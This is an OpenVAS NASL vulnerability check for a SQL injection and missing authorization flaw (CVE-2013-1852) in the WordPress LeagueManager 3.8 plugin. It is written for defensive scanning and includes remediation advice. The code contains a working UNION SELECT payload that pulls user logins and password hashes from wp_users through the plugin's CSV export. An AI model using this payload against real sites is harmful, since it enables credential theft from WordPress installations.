###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_leaguemanager_plugin_mult_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Wordpress LeagueManager Plugin Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or
manipulate SQL queries in the back-end database, allowing for the manipulation
or disclosure of arbitrary data.");
  script_tag(name:"affected", value:"WordPress LeagueManager Plugin Version 3.8");
  script_tag(name:"insight", value:"Multiple flaws due to,

  - Input passed via the 'league_id' POST parameter to wp-admin/admin.php is
not properly sanitized before being returned to the user.

  - Not sufficiently verify authorization when accessing the CSV export
functionality.");
  script_tag(name:"solution", value:"Update to version 3.8.1 or later.");
  script_tag(name:"summary", value:"This host is installed with Wordpress LeagueManager Plugin and
is prone to multiple vulnerabilities.");
  script_oid("1.3.6.1.4.1.25623.1.0.803439");
  script_version("$Revision: 11865 $");
  script_bugtraq_id(58503);
  script_cve_id("CVE-2013-1852");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-18 10:46:35 +0530 (Mon, 18 Mar 2013)");
  script_name("Wordpress LeagueManager Plugin Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://1337day.com/exploit/20511");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013030138");
  script_xref(name:"URL", value:"http://www.mondounix.com/wordpress-leaguemanager-3-8-sql-injection");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wordpress-leaguemanager-38-sql-injection");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/support/plugin/leaguemanager");
  exit(0);
}

CPE = 'cpe:/a:wordpress:wordpress';

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/wp-admin/admin.php?page=leaguemanager-export";
postData = "league_id=7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,9,10,11,12,13,"+
           "user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--&mode=teams&"+
           "leaguemanager_export=Download+File";

host = http_host_name(port:port);

sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");

rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

if(rcvRes && rcvRes =~ 'Season.*Team.*Website.*Coach.*Home') {
  security_message(port:port, data:"The target host was found to be vulnerable");
	exit(0);
}
